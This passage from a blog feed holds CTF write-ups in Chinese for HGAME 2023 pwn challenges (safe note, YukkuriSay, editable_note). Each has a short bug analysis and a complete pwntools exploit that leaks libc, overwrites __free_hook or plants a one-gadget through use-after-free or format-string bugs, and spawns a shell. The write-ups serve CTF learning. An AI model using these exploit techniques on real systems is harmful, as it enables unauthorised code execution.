punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cat '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gedit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'gedit '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'ln '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1  <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    rm<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>cat<span class="token punctuation">(</span><span class="token string">'try7.txt'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1104</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseli<span class="token punctuation">(</span><span class="token string">'free_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basetouch<span class="token punctuation">(</span><span class="token string">'try8.txt'</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try11.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2023 week3 pwn</title>
      <link href="/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/"/>
      <url>/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>libc版本是2.32，要注意异或加密fd，加密方式为(堆地址&gt;&gt;12)&amp;申请的地址</p><p>1.创建并释放一个堆获取堆地址</p><p>2.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system（show之前要edit</p><p>3.利用UAF漏洞实现任意地址写，把free_hook改成system，改fd的时候要使用2.32的加密方式进行加密</p><p>4.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;vuln&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)def add(index, size):    r.sendlineafter(&#39;&gt;&#39;, b&#39;1&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Size: &#39;, str(size))def delete(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;2&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))def edit(index, content):    r.sendlineafter(&#39;&gt;&#39;, b&#39;3&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Content: &#39;, content)def show(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;4&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))add(0, 0x90)delete(0)show(0)heap &#x3D; u64(r.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12li(&#39;heap &#x3D; &#39; + hex(heap))for i in range(8):    add(i + 1 , 0x80)add(9, 0x20)add(10, 0x20)for i in range(8):    delete(i + 1)edit(8, &#39;&#39;)show(8)malloc_hook &#x3D; u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 106 - 0x10li(&#39;malloc_hook &#x3D; &#39; + hex(malloc_hook))libc &#x3D; ELF(&#39;.&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc-2.32.so&#39;)libc_base &#x3D; malloc_hook - libc.sym[&#39;__malloc_hook&#39;]free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]li(&#39;free_hook &#x3D; &#39; + hex(free_hook))system &#x3D; libc_base + libc.sym[&#39;system&#39;]li(&#39;system &#x3D; &#39; + hex(system))li(&#39;heap &#x3D; &#39; + hex(heap))delete(9)delete(10)edit(10, p64((heap&gt;&gt;12)  ^ free_hook))add(11, 0x20)edit(11, b&#39;&#x2F;bin&#x2F;sh\x00&#39;)add(12, 0x20)edit(12, p64(system))delete(11)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2023-week2-pwn</title>
      <link href="/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/"/>
      <url>/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1.read不会设置缓冲区最后一个字节为’\0’ ，程序中将读取到的字符串回车改写为0，因此在输出字符串时若其中有残留地址则可泄露地址</p><p>2.gift中存在格式化字符串，但读取内容存在bss段，是非栈上的格式化字符串</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用循环中read泄露栈和libc地址</p><p>  （1）调试中下断点得到setbuf和栈到字符串的偏移</p><p>  （2）填充掉偏移部分直到所需泄露的地址，进行地址泄露</p><p>  （3）调试得到泄露到的地址和所需地址之间的偏移，直接在泄露的地址上进行加减</p><p> 2.布栈</p><p>  （1）输出ogg，在stack中找到最接近并且printf之后能运行到的地址，根据修改位数确定栈布局</p><p>3.利用格式化字符串进行任意地址写</p><p>   （1）调试中输入8个a，8个b，8个c，获取栈布局，利用fmt工具获取三个地址偏移</p><p>   （2）计算ogg低字节和低二三字节</p><p>   （3）用hhn写入单字节，hn写入双字节，实现任意地址写</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">32265</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xf8</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'What would you like to let Yukkri say?'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>setbuffer <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">204</span>libc_base <span class="token operator">=</span> setbuffer <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setbuffer'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x118</span> <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__libc_start_main  <span class="token operator">=</span> stack <span class="token operator">+</span>  <span class="token number">0x8</span>   <span class="token comment">#__libc_start_main + 24</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> p64<span class="token punctuation">(</span>__libc_start_main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__libc_start_main <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p3<span class="token punctuation">)</span>gadget1 <span class="token operator">=</span> gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span>gadget2 <span class="token operator">=</span> <span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%8$hhn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">-</span> <span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%9$hn'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'gift for you: \n'</span><span class="token punctuation">,</span>p4<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system</p><p>2.利用UAF漏洞实现任意地址写，把free_hook改成system</p><p>3.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">30756</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 